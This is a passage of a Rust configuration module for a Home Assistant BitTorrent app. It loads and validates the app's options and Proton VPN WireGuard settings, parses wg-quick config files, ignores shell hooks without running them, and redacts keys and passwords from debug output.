//! Loads `/data/options.json` and the Proton VPN WireGuard configuration and
//! validates everything *before* any network state is touched, so mistakes
//! fail fast with a message that makes sense in the Home Assistant log.
//!
//! WireGuard settings come from three sources, highest priority first:
//! 1. `/config/wg0.conf` dropped into the app's config folder,
//! 2. the `wireguard_conf` option (multi-line, or flattened by the UI),
//! 3. the structured `wg_*` options, which only fill in what 1/2 leave out.

use std::fmt;
use std::net::{IpAddr, Ipv4Addr};
use std::path::{Component, Path, PathBuf};

use anyhow::{Context, Result, anyhow, bail};
use serde::{Deserialize, Serialize};

use crate::cidr::{self, Ipv4Cidr};

/// Proton VPN's in-tunnel gateway (DNS + NAT-PMP).
pub const PROTON_GATEWAY: Ipv4Addr = Ipv4Addr::new(10, 2, 0, 1);
pub const DEFAULT_KEEPALIVE: u16 = 25;
/// Safe for PPPoE / VLAN uplinks (1500 - 80 bytes of WireGuard/IPv6 overhead).
pub const DEFAULT_MTU: u16 = 1420;
pub const DEFAULT_WG_PORT: u16 = 51820;
/// rtbit HTTP API + Web UI port (also the qBittorrent-compatible `/api/v2`).
pub const WEBUI_PORT: u16 = 8080;
/// rtbit's default BitTorrent port, used when NAT-PMP is disabled/unavailable.
pub const DEFAULT_LISTEN_PORT: u16 = 4240;
/// Home Assistant Ingress proxy port (config.yaml `ingress_port`).
pub const INGRESS_PORT: u16 = 8099;
/// File name of the optional WireGuard config inside the app config folder.
pub const WG_CONF_FILE: &str = "wg0.conf";
/// File (inside the app config folder) holding the generated Web UI password.
pub const GENERATED_PASSWORD_FILE: &str = ".webui-password";
pub const DEFAULT_WEBUI_USERNAME: &str = "admin";
/// Home Assistant's internal network (Supervisor, Core, Ingress, other apps).
pub const HASSIO_NETWORK: Ipv4Cidr = Ipv4Cidr::from_parts(Ipv4Addr::new(172, 30, 32, 0), 23);

/// Address ranges a `local_allow_cidrs` entry may fall into. Anything else
/// (e.g. `0.0.0.0/0` or a public range) would punch a hole around the tunnel.
const PERMITTED_LOCAL_RANGES: [(Ipv4Addr, u8); 5] = [
    (Ipv4Addr::new(10, 0, 0, 0), 8),
    (Ipv4Addr::new(172, 16, 0, 0), 12),
    (Ipv4Addr::new(192, 168, 0, 0), 16),
    (Ipv4Addr::new(100, 64, 0, 0), 10), // CGNAT / Tailscale
    (Ipv4Addr::new(169, 254, 0, 0), 16),
];

/// Directories rtbit may write payload data to (the app's `map:` entries).
pub const PERMITTED_DATA_ROOTS: [&str; 3] = ["/media", "/share", "/config"];

// ---------------------------------------------------------------------------
// Raw options (/data/options.json)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize, Serialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum LogLevel {
    Trace,
    Debug,
    #[default]
    Info,
    Warn,
    Error,
}

impl LogLevel {
    pub fn as_str(self) -> &'static str {
        match self {
            LogLevel::Trace => "trace",
            LogLevel::Debug => "debug",
            LogLevel::Info => "info",
            LogLevel::Warn => "warn",
            LogLevel::Error => "error",
        }
    }

    pub fn as_tracing(self) -> tracing::Level {
        match self {
            LogLevel::Trace => tracing::Level::TRACE,
            LogLevel::Debug => tracing::Level::DEBUG,
            LogLevel::Info => tracing::Level::INFO,
            LogLevel::Warn => tracing::Level::WARN,
            LogLevel::Error => tracing::Level::ERROR,
        }
    }
}

/// The app options exactly as Home Assistant writes them. Every field has a
/// default so a partially filled form still deserialises and validation can
/// explain what is missing.
#[derive(Clone, Deserialize)]
#[serde(default)]
pub struct Options {
    /// VPN mode. Off by default so a fresh install starts (unprotected, with a
    /// loud warning); any WireGuard material turns it on regardless.
    pub vpn_enabled: bool,
    pub wireguard_conf: Option<String>,
    pub wg_private_key: Option<String>,
    pub wg_public_key: Option<String>,
    pub wg_preshared_key: Option<String>,
    pub wg_endpoint: Option<String>,
    pub wg_address: Option<String>,
    pub wg_dns: Option<String>,
    pub nat_pmp_gateway: String,
    pub enable_nat_pmp: bool,
    pub listen_port: u16,
    pub download_dir: String,
    pub completed_dir: String,
    pub local_allow_cidrs: Vec<String>,
    pub log_level: LogLevel,
    pub webui_username: String,
    pub webui_password: Option<String>,
    pub enable_dht: bool,
    /// Take over an existing qBittorrent installation once (migration.rs).
    pub import_from_qbittorrent: bool,
    /// Also re-add qBittorrent's torrents from `BT_backup` (opt-in).
    pub import_active_torrents: bool,
    /// Start even when the kernel cannot provide the Landlock filesystem
    /// sandbox (opt-out; the app refuses to start otherwise).
    pub allow_unsandboxed: bool,
}

impl Default for Options {
    fn default() -> Self {
        Self {
            vpn_enabled: false,
            wireguard_conf: None,
            wg_private_key: None,
            wg_public_key: None,
            wg_preshared_key: None,
            wg_endpoint: None,
            wg_address: None,
            wg_dns: None,
            nat_pmp_gateway: PROTON_GATEWAY.to_string(),
            enable_nat_pmp: true,
            listen_port: DEFAULT_LISTEN_PORT,
            download_dir: "/media/rbittorrent/downloads".to_owned(),
            completed_dir: "/media/rbittorrent/completed".to_owned(),
            local_allow_cidrs: vec![
                "172.30.32.0/23".to_owned(),
                "172.16.0.0/12".to_owned(),
                "192.168.0.0/16".to_owned(),
                "10.0.0.0/8".to_owned(),
            ],
            log_level: LogLevel::Info,
            webui_username: DEFAULT_WEBUI_USERNAME.to_owned(),
            webui_password: None,
            enable_dht: true,
            import_from_qbittorrent: true,
            import_active_torrents: false,
            allow_unsandboxed: false,
        }
    }
}

/// Hand-written so a `{:?}` can never print the private key, preshared key,
/// pasted `.conf` or Web UI password: secrets show only whether they are set.
impl fmt::Debug for Options {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let set = |v: &Option<String>| v.as_ref().map(|_| "<redacted>");
        f.debug_struct("Options")
            .field("vpn_enabled", &self.vpn_enabled)
            .field("wireguard_conf", &set(&self.wireguard_conf))
            .field("wg_private_key", &set(&self.wg_private_key))
            .field("wg_public_key", &self.wg_public_key)
            .field("wg_preshared_key", &set(&self.wg_preshared_key))
            .field("wg_endpoint", &self.wg_endpoint)
            .field("wg_address", &self.wg_address)
            .field("wg_dns", &self.wg_dns)
            .field("nat_pmp_gateway", &self.nat_pmp_gateway)
            .field("enable_nat_pmp", &self.enable_nat_pmp)
            .field("listen_port", &self.listen_port)
            .field("download_dir", &self.download_dir)
            .field("completed_dir", &self.completed_dir)
            .field("local_allow_cidrs", &self.local_allow_cidrs)
            .field("log_level", &self.log_level)
            .field("webui_username", &self.webui_username)
            .field("webui_password", &set(&self.webui_password))
            .field("enable_dht", &self.enable_dht)
            .field("import_from_qbittorrent", &self.import_from_qbittorrent)
            .field("import_active_torrents", &self.import_active_torrents)
            .field("allow_unsandboxed", &self.allow_unsandboxed)
            .finish()
    }
}

impl Options {
    pub fn from_json(text: &str) -> Result<Self> {
        serde_json::from_str(text).context("the app options are not valid JSON")
    }

    pub fn load(path: &Path) -> Result<Self> {
        let text = std::fs::read_to_string(path).with_context(|| {
            format!(
                "cannot read app options from {} (outside Home Assistant, point \
                 RBITTORRENT_OPTIONS at an options.json file)",
                path.display()
            )
        })?;
        Self::from_json(&text)
    }
}

/// Returns the trimmed value when the option is present and non-blank.
fn non_blank(v: &Option<String>) -> Option<&str> {
    v.as_deref().map(str::trim).filter(|s| !s.is_empty())
}

/// Something (even an unreadable or empty file) exists at `path`. Errors other
/// than "not found" count as present: when in doubt, the VPN stays on.
pub fn path_present(path: &Path) -> bool {
    match std::fs::symlink_metadata(path) {
        Ok(_) => true,
        Err(e) => e.kind() != std::io::ErrorKind::NotFound,
    }
}

/// Why the app must run in VPN mode, or `None` for a direct connection.
///
/// Fail-closed: `vpn_enabled`, a `/config/wg0.conf` (also one copied over from
/// qBittorrent), a pasted `wireguard_conf` or any `wg_*` field each switch the
/// VPN on, and an incomplete configuration is then an error, never a silent
/// fallback to the unprotected connection.
pub fn vpn_intent(opts: &Options, wg_file_present: bool) -> Option<String> {
    if opts.vpn_enabled {
        return Some("`vpn_enabled` is on".to_owned());
    }
    if wg_file_present {
        return Some(format!("auto-enabled: /config/{WG_CONF_FILE} exists"));
    }
    let fields = [
        ("wireguard_conf", &opts.wireguard_conf),
        ("wg_private_key", &opts.wg_private_key),
        ("wg_public_key", &opts.wg_public_key),
        ("wg_preshared_key", &opts.wg_preshared_key),
        ("wg_endpoint", &opts.wg_endpoint),
        ("wg_address", &opts.wg_address),
        ("wg_dns", &opts.wg_dns),
    ];
    fields
        .iter()
        .find(|(_, v)| non_blank(v).is_some())
        .map(|(name, _)| format!("auto-enabled: `{name}` is filled in"))
}

/// A secret string (Web UI password). `Debug` never prints it.
#[derive(Clone, PartialEq, Eq)]
pub struct Secret(String);

impl Secret {
    pub fn new(value: String) -> Self {
        Self(value)
    }

    pub fn expose(&self) -> &str {
        &self.0
    }
}

impl fmt::Debug for Secret {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("Secret(<redacted>)")
    }
}

// ---------------------------------------------------------------------------
// WireGuard keys
// ---------------------------------------------------------------------------

/// A validated 32-byte WireGuard key in its base64 form. `Debug`/`Display`
/// never print the key material.
#[derive(Clone, PartialEq, Eq)]
pub struct WgKey(String);

impl WgKey {
    pub fn parse(field: &str, value: &str) -> Result<Self> {
        let value = value.trim();
        if decode_key(value).is_none() {
            bail!(
                "`{field}` is not a valid WireGuard key: expected 44 base64 characters \
                 ending in '=' (copy it again from the Proton VPN WireGuard page)"
            );
        }
        Ok(Self(value.to_owned()))
    }

    pub fn as_base64(&self) -> &str {
        &self.0
    }

    /// First characters of a *public* key, for logs. Never call this on a private key.
    pub fn short(&self) -> &str {
        self.0.get(..8).unwrap_or("")
    }
}

impl fmt::Debug for WgKey {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str("WgKey(<redacted>)")
    }
}

fn b64_value(c: u8) -> Option<u32> {
    let v = match c {
        b'A'..=b'Z' => c - b'A',
        b'a'..=b'z' => c - b'a' + 26,
        b'0'..=b'9' => c - b'0' + 52,
        b'+' => 62,
        b'/' => 63,
        _ => return None,
    };
    Some(u32::from(v))
}

/// Decodes a WireGuard base64 key (44 chars, one `=` of padding, 32 bytes).
pub fn decode_key(s: &str) -> Option<[u8; 32]> {
    let bytes = s.as_bytes();
    let (body, pad) = bytes.split_at_checked(43)?;
    if pad != b"=" {
        return None;
    }
    let mut out = [0u8; 32];
    let mut acc: u32 = 0;
    let mut bits: u32 = 0;
    let mut written = 0usize;
    for &c in body {
        acc = (acc << 6) | b64_value(c)?;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            let byte = u8::try_from((acc >> bits) & 0xff).ok()?;
            *out.get_mut(written)? = byte;
            written += 1;
            acc &= (1 << bits) - 1;
        }
    }
    // 43 * 6 = 258 bits: exactly 32 bytes plus 2 padding bits that must be zero.
    (written == 32 && acc == 0).then_some(out)
}

// ---------------------------------------------------------------------------
// Endpoint
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum EndpointHost {
    Ip(Ipv4Addr),
    Name(String),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Endpoint {
    pub host: EndpointHost,
    pub port: u16,
}

impl fmt::Display for Endpoint {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match &self.host {
            EndpointHost::Ip(ip) => write!(f, "{ip}:{}", self.port),
            EndpointHost::Name(n) => write!(f, "{n}:{}", self.port),
        }
    }
}

/// Splits `host:port`, `a.b.c.d:port` or a bare host (port 51820).
pub fn parse_endpoint(raw: &str) -> Result<Endpoint> {
    let s = raw.trim();
    if s.is_empty() {
        bail!("the WireGuard endpoint is empty");
    }
    let ipv6_err = || {
        anyhow!(
            "WireGuard endpoint `{s}` is IPv6; IPv6 is blocked by the kill-switch, \
             use the server's IPv4 address or hostname"
        )
    };
    if s.starts_with('[') || s.matches(':').count() > 1 {
        return Err(ipv6_err());
    }
    let (host, port) = match s.rsplit_once(':') {
        Some((h, p)) => {
            let port = p
                .trim()
                .parse::<u16>()
                .ok()
                .filter(|p| *p != 0)
                .ok_or_else(|| anyhow!("WireGuard endpoint `{s}` has an invalid port"))?;
            (h.trim(), port)
        }
        None => (s, DEFAULT_WG_PORT),
    };
    if let Ok(ip) = host.parse::<IpAddr>() {
        return match ip {
            IpAddr::V4(v4) if usable_unicast(v4) => Ok(Endpoint {
                host: EndpointHost::Ip(v4),
                port,
            }),
            IpAddr::V4(_) => bail!("WireGuard endpoint `{s}` is not a usable address"),
            IpAddr::V6(_) => Err(ipv6_err()),
        };
    }
    let valid_name = !host.is_empty()
        && host.len() <= 253
        && host.split('.').all(|l| {
            !l.is_empty()
                && l.len() <= 63
                && l.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
        });
    if !valid_name {
        bail!("WireGuard endpoint host `{host}` is neither an IPv4 address nor a valid hostname");
    }
    Ok(Endpoint {
        host: EndpointHost::Name(host.to_ascii_lowercase()),
        port,
    })
}

// ---------------------------------------------------------------------------
// WireGuard .conf parser
// ---------------------------------------------------------------------------

/// Keys recognised when splitting a `.conf` that lost its line breaks.
const KNOWN_KEYS: [&str; 17] = [
    "PrivateKey",
    "Address",
    "DNS",
    "MTU",
    "ListenPort",
    "Table",
    "FwMark",
    "PreUp",
    "PostUp",
    "PreDown",
    "PostDown",
    "SaveConfig",
    "PublicKey",
    "PresharedKey",
    "AllowedIPs",
    "Endpoint",
    "PersistentKeepalive",
];

/// The raw values of a parsed `.conf`, before merging and validation.
#[derive(Default, Clone, PartialEq, Eq)]
pub struct WgConf {
    pub private_key: Option<String>,
    pub addresses: Vec<String>,
    pub dns: Vec<String>,
    pub mtu: Option<u16>,
    pub peer_public_key: Option<String>,
    pub preshared_key: Option<String>,
    pub allowed_ips: Vec<String>,
    pub endpoint: Option<String>,
    pub persistent_keepalive: Option<u16>,
    /// From Proton's `# NAT-PMP (Port Forwarding) = on|off` header comment.
    pub proton_nat_pmp: Option<bool>,
    /// Non-fatal observations to surface in the log.
    pub warnings: Vec<String>,
}

/// Hand-written: the private and preshared keys are never printed.
impl fmt::Debug for WgConf {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let set = |v: &Option<String>| v.as_ref().map(|_| "<redacted>");
        f.debug_struct("WgConf")
            .field("private_key", &set(&self.private_key))
            .field("addresses", &self.addresses)
            .field("dns", &self.dns)
            .field("mtu", &self.mtu)
            .field("peer_public_key", &self.peer_public_key)
            .field("preshared_key", &set(&self.preshared_key))
            .field("allowed_ips", &self.allowed_ips)
            .field("endpoint", &self.endpoint)
            .field("persistent_keepalive", &self.persistent_keepalive)
            .field("proton_nat_pmp", &self.proton_nat_pmp)
            .field("warnings", &self.warnings)
            .finish()
    }
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Section {
    None,
    Interface,
    Peer,
}

fn split_list(v: &str) -> impl Iterator<Item = String> + '_ {
    v.split([',', ' ', '\t'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(str::to_owned)
}

/// Finds Proton's `NAT-PMP (Port Forwarding) = on|off` marker anywhere in the text.
fn detect_proton_nat_pmp(text: &str) -> Option<bool> {
    let lower = text.to_ascii_lowercase();
    let idx = lower.find("nat-pmp (port forwarding)")?;
    let rest = lower.get(idx + "nat-pmp (port forwarding)".len()..)?;
    let rest = rest.trim_start().strip_prefix('=')?.trim_start();
    if rest.starts_with("on") {
        Some(true)
    } else if rest.starts_with("off") {
        Some(false)
    } else {
        None
    }
}

/// Keys whose value is a 44-character base64 WireGuard key.
const KEY_VALUED: [&str; 3] = ["privatekey", "publickey", "presharedkey"];

/// Hook keys: their values are shell commands (never executed, only warned
/// about) and may contain `;`, `#` or `key=value` text of their own.
const HOOK_KEYS: [&str; 4] = ["preup", "postup", "predown", "postdown"];

/// Length of the section header `rest` (lowercase) starts with.
fn header_at(rest: &str) -> Option<usize> {
    ["[interface]", "[peer]"]
        .into_iter()
        .find(|h| rest.starts_with(h))
        .map(str::len)
}

/// The known key (lowercase) `rest` (lowercase) starts with, when it is
/// followed by optional blanks and `=`.
fn key_at(rest: &str) -> Option<String> {
    KNOWN_KEYS.iter().map(|k| k.to_ascii_lowercase()).find(|k| {
        rest.strip_prefix(k.as_str())
            .is_some_and(|after| after.trim_start_matches([' ', '\t']).starts_with('='))
    })
}

/// True when `rest` (lowercase) starts with a section header or `Key =`.
fn starts_entry(rest: &str) -> bool {
    header_at(rest).is_some() || key_at(rest).is_some()
}

fn char_len_at(text: &str, i: usize) -> usize {
    text.get(i..)
        .and_then(|r| r.chars().next())
        .map_or(1, char::len_utf8)
}

/// Offset just past `Key<blanks>=<blanks>` for a key starting at `i`.
fn value_start(lower: &str, i: usize, key_len: usize) -> usize {
    let after_key = i + key_len;
    let eq = lower
        .get(after_key..)
        .and_then(|r| r.find('='))
        .map_or(after_key, |off| after_key + off + 1);
    eq + lower
        .get(eq..)
        .map_or(0, |r| r.len() - r.trim_start_matches([' ', '\t']).len())
}

/// End of a base64 key value starting at `i`: at most 44 characters, up to
/// and including the first `=` (the padding every WireGuard key ends with),
/// and never across a blank, `;`, `#` or `[`. A short or truncated key thus
/// stays short (and fails validation) instead of swallowing the next entry.
fn key_value_end(text: &str, i: usize) -> usize {
    let mut j = i;
    for (n, c) in text.get(i..).unwrap_or("").char_indices() {
        if n >= 44 || c.is_whitespace() || matches!(c, ';' | '#' | '[') {
            return i + n;
        }
        j = i + n + c.len_utf8();
        if c == '=' {
            return j;
        }
    }
    j
}

/// End of a hook value starting at `i`: the next section header, `#`, or a
/// `;` that is followed by a new entry (or nothing). Text inside a hook is
/// never split into directives.
fn hook_value_end(lower: &str, i: usize) -> usize {
    let mut j = i;
    while j < lower.len() {
        let rest = lower.get(j..).unwrap_or("");
        if header_at(rest).is_some() || rest.starts_with('#') {
            return j;
        }
        if let Some(after) = rest.strip_prefix(';') {
            let after = after.trim_start_matches([' ', '\t']);
            if after.is_empty() || starts_entry(after) {
                return j;
            }
        }
        j += char_len_at(lower, j);
    }
    lower.len()
}

/// End of a `#` comment starting at `i` in a flattened paste. The first
/// token after `#` belongs to the comment even when it looks like a key or a
/// header, so a commented-out `# DNS = 9.9.9.9` or `# [Peer]` stays a
/// comment. After that, the next `#`, header or `Key =` ends it (Proton puts
/// comments right before `PrivateKey`).
fn comment_end(lower: &str, i: usize) -> usize {
    let mut j = i + 1;
    let rest = lower.get(j..).unwrap_or("");
    j += rest.len() - rest.trim_start_matches([' ', '\t']).len();
    let rest = lower.get(j..).unwrap_or("");
    if let Some(h) = header_at(rest) {
        j += h;
    } else if let Some(k) = key_at(rest) {
        j = value_start(lower, j, k.len());
        if KEY_VALUED.contains(&k.as_str()) {
            j = key_value_end(lower, j);
        }
    }
    while j < lower.len() {
        let rest = lower.get(j..).unwrap_or("");
        if rest.starts_with('#') || starts_entry(rest) {
            return j;
        }
        j += char_len_at(lower, j);
    }
    lower.len()
}

/// Re-inserts line breaks into a `.conf` that was flattened by a single-line
/// text field (newlines turned into spaces, `;` or, as browsers do for
/// `<input>`, nothing at all).
///
/// A line break goes before every section header, comment and known key
/// that is followed by `=`; a `;` right before one of those (or at the end)
/// is a separator and is dropped. Base64 key values, hook commands and
/// comments are copied as one piece, so nothing inside them can turn into a
/// directive.
fn restore_line_breaks(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 64);
    // ASCII lowercasing keeps byte offsets identical to `text`.
    let lower = text.to_ascii_lowercase();
    let mut i = 0usize;
    while i < text.len() {
        let rest_lower = lower.get(i..).unwrap_or("");
        if let Some(after) = rest_lower.strip_prefix(';') {
            let after = after.trim_start_matches([' ', '\t']);
            if after.is_empty() || after.starts_with('\n') || starts_entry(after) {
                out.push('\n');
                i += 1;
                continue;
            }
        }
        if rest_lower.starts_with('#') {
            let end = comment_end(&lower, i);
            out.push('\n');
            out.push_str(text.get(i..end).unwrap_or(""));
            i = end;
            continue;
        }
        if let Some(h) = header_at(rest_lower) {
            out.push('\n');
            out.push_str(text.get(i..i + h).unwrap_or(""));
            i += h;
            continue;
        }
        if let Some(k) = key_at(rest_lower) {
            out.push('\n');
            let start = value_start(&lower, i, k.len());
            out.push_str(text.get(i..start).unwrap_or(""));
            i = start;
            let end = if KEY_VALUED.contains(&k.as_str()) {
                key_value_end(text, i)
            } else if HOOK_KEYS.contains(&k.as_str()) {
                hook_value_end(&lower, i)
            } else {
                i
            };
            out.push_str(text.get(i..end).unwrap_or(""));
            i = end;
            continue;
        }
        let ch_len = char_len_at(text, i);
        out.push_str(text.get(i..i + ch_len).unwrap_or(""));
        i += ch_len;
    }
    out
}

/// Multi-line configs: splits one line's code (comment already removed) at
/// `;` separators that are followed by a new entry, as in
/// `PrivateKey = ...; Address = ...`. Hook lines are left alone: their `;`
/// separate shell commands, not directives.
fn split_semicolons(code: &str) -> String {
    let lower = code.to_ascii_lowercase();
    let key = lower.split_once('=').map(|(k, _)| k.trim());
    if !code.contains(';') || key.is_some_and(|k| HOOK_KEYS.contains(&k)) {
        return code.to_owned();
    }
    let mut out = String::with_capacity(code.len() + 8);
    let mut i = 0usize;
    while i < code.len() {
        let rest = lower.get(i..).unwrap_or("");
        if let Some(after) = rest.strip_prefix(';') {
            let after = after.trim_start_matches([' ', '\t']);
            if after.is_empty() || starts_entry(after) {
                out.push('\n');
                i += 1;
                continue;
            }
        }
        let ch_len = char_len_at(code, i);
        out.push_str(code.get(i..i + ch_len).unwrap_or(""));
        i += ch_len;
    }
    out
}

/// Parses a wg-quick style `.conf`. Comments (`#`), blank lines, CRLF line
/// endings, odd spacing and a single-line paste are all accepted. Hook keys
/// (`PostUp`, ...) are ignored on purpose: this app never runs shell code
/// from its configuration.
pub fn parse_wg_conf(raw: &str) -> Result<WgConf> {
    let text = raw
        .trim_start_matches('\u{feff}')
        .replace("\r\n", "\n")
        .replace('\r', "\n");
    let mut conf = WgConf {
        proton_nat_pmp: detect_proton_nat_pmp(&text),
        ..WgConf::default()
    };
    let text = if text.trim().contains('\n') {
        // Multi-line: comments stay untouched (a commented-out `# DNS = x`
        // must not come back to life); code is split on `;` separators.
        text.lines()
            .map(|line| match line.split_once('#') {
                Some((code, comment)) => format!("{}#{comment}", split_semicolons(code)),
                None => split_semicolons(line),
            })
            .collect::<Vec<_>>()
            .join("\n")
    } else {
        restore_line_breaks(&text)
    };

    let mut section = Section::None;
    let mut peers = 0usize;
    for (idx, line) in text.lines().enumerate() {
        let lineno = idx + 1;
        // `;` at either end is a leftover separator from a flattened paste.
        let line = line
            .split('#')
            .next()
            .unwrap_or("")
            .trim_matches(|c: char| c == ';' || c.is_whitespace());
        if line.is_empty() {
            continue;
        }
        if let Some(name) = line.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            section = match name.trim().to_ascii_lowercase().as_str() {
                "interface" => Section::Interface,
                "peer" => {
                    peers += 1;
                    if peers > 1 {
                        bail!(
                            "the WireGuard config has more than one [Peer]; Proton VPN \
                             configs have exactly one server"
                        );
                    }
                    Section::Peer
                }
                other if is_plain_key_name(other) => {
                    bail!("WireGuard config line {lineno}: unknown section [{other}]")
                }
                _ => bail!("WireGuard config line {lineno}: unknown section"),
            };
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            // Never echo the line: it may be a private key pasted on its own.
            bail!(
                "WireGuard config line {lineno}: expected `Key = Value` (the line's content is \
                 not shown because it may hold a key)"
            );
        };
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim().trim_end_matches(';').trim_end();
        match (section, key.as_str()) {
            (Section::None, _) => {
                bail!("WireGuard config line {lineno}: `{key}` appears before [Interface]")
            }
            (Section::Interface, "privatekey") => set_once(
                &mut conf.private_key,
                value,
                "PrivateKey",
                &mut conf.warnings,
            ),
            (Section::Interface, "address") => conf.addresses.extend(split_list(value)),
            (Section::Interface, "dns") => conf.dns.extend(split_list(value)),
            (Section::Interface, "mtu") => {
                conf.mtu = Some(value.parse().map_err(|_| {
                    anyhow!("WireGuard config line {lineno}: MTU `{value}` is not a number")
                })?)
            }
            (
                Section::Interface,
                "listenport" | "table" | "fwmark" | "preup" | "postup" | "predown" | "postdown"
                | "saveconfig",
            ) => conf.warnings.push(format!(
                "ignoring `{key}` from the WireGuard config (not needed; hooks are never executed)"
            )),
            (Section::Peer, "publickey") => set_once(
                &mut conf.peer_public_key,
                value,
                "PublicKey",
                &mut conf.warnings,
            ),
            (Section::Peer, "presharedkey") => set_once(
                &mut conf.preshared_key,
                value,
                "PresharedKey",
                &mut conf.warnings,
            ),
            (Section::Peer, "allowedips") => conf.allowed_ips.extend(split_list(value)),
            (Section::Peer, "endpoint") => {
                set_once(&mut conf.endpoint, value, "Endpoint", &mut conf.warnings)
            }
            (Section::Peer, "persistentkeepalive") => {
                conf.persistent_keepalive = if value.eq_ignore_ascii_case("off") {
                    Some(0)
                } else {
                    Some(value.parse().map_err(|_| {
                        anyhow!(
                            "WireGuard config line {lineno}: PersistentKeepalive `{value}` \
                             is not a number"
                        )
                    })?)
                }
            }
            (_, other) => conf.warnings.push(if is_plain_key_name(other) {
                format!("ignoring unknown WireGuard config key `{other}` (line {lineno})")
            } else {
                // A bare base64 key ends in `=` and would split into a
                // "key" holding 43 of its 44 characters: never print that.
                format!("ignoring unrecognised WireGuard config line {lineno}")
            }),
        }
    }
    Ok(conf)
}

/// A key name worth echoing in a warning: short and letters only, so no
/// base64 key material can be printed by accident.
fn is_plain_key_name(key: &str) -> bool {
    !key.is_empty() && key.len() <= 24 && key.bytes().all(|b| b.is_ascii_alphabetic())
}

fn set_once(slot: &mut Option<String>, value: &str, name: &str, warnings: &mut Vec<String>) {
    if slot.is_some() {
        warnings.push(format!(
            "`{name}` appears more than once in the WireGuard config; using the last one"
        ));
    }
    *slot = Some(value.to_owned());
}

// ---------------------------------------------------------------------------
// Validated settings
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WireGuardConfig {
    pub private_key: WgKey,
    pub peer_public_key: WgKey,
    pub preshared_key: Option<WgKey>,
    pub endpoint: Endpoint,
    /// The tunnel address, e.g. `10.2.0.2/32` (host bits preserved).
    pub address: Ipv4Cidr,
    pub dns: Vec<Ipv4Addr>,
    pub persistent_keepalive: u16,
    pub mtu: u16,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NatPmpSettings {
    pub gateway: Ipv4Addr,
}

/// VPN mode: the tunnel, its kill-switch and port forwarding.
#[derive(Debug, Clone)]
pub struct VpnSettings {
    pub wireguard: WireGuardConfig,
    /// `None`: static port mode (`listen_port` opened on wg0, e.g. for
    /// providers that forward a fixed port).
    pub nat_pmp: Option<NatPmpSettings>,
    /// Where the WireGuard settings came from (for the log).
    pub source: String,
    /// Why VPN mode is on (see [`vpn_intent`]).
    pub reason: String,
}

/// Everything the supervisor needs, fully validated.
#[derive(Debug, Clone)]
pub struct Settings {
    /// `None`: direct connection (no tunnel, no kill-switch, no NAT-PMP).
    pub vpn: Option<VpnSettings>,
    /// rtbit's BitTorrent port: the static port (direct mode, or VPN without
    /// NAT-PMP), or the fallback until NAT-PMP leases one.
    pub fallback_listen_port: u16,
    pub download_dir: PathBuf,
    pub completed_dir: PathBuf,
    /// `XDG_DATA_HOME` for rtbit (session, RSS, credentials, fast-resume).
    pub data_home: PathBuf,
    /// `XDG_CACHE_HOME` for rtbit (DHT routing table, rebuildable).
    pub cache_home: PathBuf,
    /// Collapsed LAN ranges allowed to reach (only) the Web UI/API.
    pub local_allow_cidrs: Vec<Ipv4Cidr>,
    pub log_level: LogLevel,
    pub webui_port: u16,
    /// Port of the in-process Ingress reverse proxy.
    pub ingress_port: u16,
    pub webui_username: String,
    /// `None`: generate (once) and persist a random password.
    pub webui_password: Option<Secret>,
    pub enable_dht: bool,
    /// Run the children without Landlock when the kernel has none.
    pub allow_unsandboxed: bool,
    /// The app's private `/config` folder.
    pub config_root: PathBuf,
    /// Informational notes gathered while validating (logged at startup).
    pub notes: Vec<String>,
}

/// Where the app's private `/config` (type `app_config`) lives.
#[derive(Debug, Clone)]
pub struct Paths {
    pub config_root: PathBuf,
}

impl Default for Paths {
    fn default() -> Self {
        Self {
            config_root: PathBuf::from("/config"),
        }
    }
}

/// A unicast IPv4 address a peer, DNS server or gateway can have: not
/// 0.0.0.0, loopback, multicast or broadcast.
fn usable_unicast(ip: Ipv4Addr) -> bool {
    !(ip.is_unspecified() || ip.is_loopback() || ip.is_multicast() || ip.is_broadcast())
}

/// `fd00::1/64`, `2a07:b944::2:2/128` or a bare IPv6 address.
fn is_ipv6_network(entry: &str) -> bool {
    let addr = entry.split_once('/').map_or(entry, |(a, _)| a).trim();
    addr.parse::<std::net::Ipv6Addr>().is_ok()
}

fn parse_ipv4_list(
    entries: impl IntoIterator<Item = String>,
    what: &str,
    notes: &mut Vec<String>,
) -> Vec<Ipv4Addr> {
    let mut out = Vec::new();
    for e in entries {
        match e.parse::<IpAddr>() {
            Ok(IpAddr::V4(v4)) if !usable_unicast(v4) => notes.push(format!(
                "ignoring {what} {v4} (not a usable unicast address)"
            )),
            Ok(IpAddr::V4(v4)) => {
                if !out.contains(&v4) {
                    out.push(v4);
                }
            }
            Ok(IpAddr::V6(v6)) => notes.push(format!(
                "ignoring IPv6 {what} {v6} (IPv6 is dropped by the kill-switch)"
            )),
            Err(_) => notes.push(format!("ignoring {what} entry `{e}` (not an IP address)")),
        }
    }
    out
}

/// Whether `raw` is a usable download folder (absolute, no `..`, below
/// /media, /share or /config).
pub fn validate_data_path(raw: &str) -> Result<PathBuf> {
    validate_data_dir("path", raw)
}

fn validate_data_dir(field: &str, raw: &str) -> Result<PathBuf> {
    let p = Path::new(raw.trim());
    if !p.is_absolute() {
        bail!("`{field}` must be an absolute path such as /media/rbittorrent/downloads");
    }
    if p.components().any(|c| matches!(c, Component::ParentDir)) {
